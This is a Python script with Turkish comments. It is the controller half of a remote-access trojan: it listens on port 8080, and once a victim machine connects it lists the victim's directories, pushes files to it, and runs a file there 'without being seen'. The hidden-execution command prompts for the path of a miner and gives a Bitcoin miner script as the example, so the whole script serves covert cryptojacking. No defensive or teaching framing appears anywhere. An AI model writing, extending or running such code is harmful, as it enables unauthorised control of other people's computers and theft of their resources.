#Komut Listesi
# view_cwd -> Dosyanın çalıştığı klasördeki tüm dosyaları görüntüler.
# custom_dir -> Özel dizindeki dosyaları görüntüler.
# send_files -> Dosya gönderimi
# cmd -> Dosyayı görünmeden çalıştırma

import os
import socket
import subprocess

sunucu = socket.socket()
host = socket.gethostname()
port = 8080
sunucu.bind((host,port))
print("")
print("Sunucu şu anda çalışıyor @ ",host)
print("")
print("Gelen bağlantıları bekliyor...")
sunucu.listen(1)
bglt,adr = sunucu.accept()
print("")
print(adr, "Sunucu başarılı bir şekilde bağlandı")

#Başarılı bir şekilde bağlandı.

#Komut kullanma

while 1:
    print("")
    komut = input(str("Komut >> "))
    if komut =="view_cwd":
        bglt.send(komut.encode())
        print("")
        print("Yürütülmeyi bekleyen komut gönderildi.")
        print("")
        dosyalar = bglt.recv(5000)
        dosyalar = dosyalar.decode()
        print("Komut çıkışı : ",dosyalar)
        
    elif komut == "custom_dir":
        bglt.send(komut.encode())
        print("")
        kullanici_giris = input(str("Özel Dizin: "))
        bglt.send(kullanici_giris.encode())
        print("")
        print("Komut gönderildi.")
        print("")
        dosyalar = bglt.recv(5000)
        dosyalar = dosyalar.decode()
        print("Özel Dizin Sonucu: ",dosyalar)
        
    elif komut == "send_files":
        bglt.send(komut.encode())
        dosya = input(str("Dosya adını ve dosya dizinini girin: "))
        dosya_adi = input(str("Dosyanın dosya adını girin: "))
        veri = open(dosya,"rb")
        dosya_verisi = veri.read(7000)
        bglt.send(dosya_adi.encode())
        print(dosya, "Başarılı bir şekilde gönderildi.")       
        bglt.send(dosya_verisi)
        
    elif komut == "cmd":
        bglt.send(komut.encode())
        cmd = input(str("Miner dosyasının dosya yolunu giriniz: "))
        # python BtcPyminer-main\pyminer.py
        bglt.send(cmd.encode())
        print("")
        print("Komut gönderildi.")       

    
    else:
        print("")
        print("komut tanınamadı.")
